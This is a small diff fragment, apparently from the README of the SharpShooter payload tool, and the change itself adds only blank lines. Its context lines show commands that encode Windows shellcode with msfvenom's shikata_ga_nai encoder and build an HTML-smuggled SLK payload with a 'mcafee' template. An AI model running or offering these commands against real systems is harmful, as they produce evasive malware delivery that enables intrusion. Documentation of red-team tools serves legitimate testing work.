@@ -30,3 +30,5 @@ SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smugg
 msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\x00'
 SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
 ```
+
+
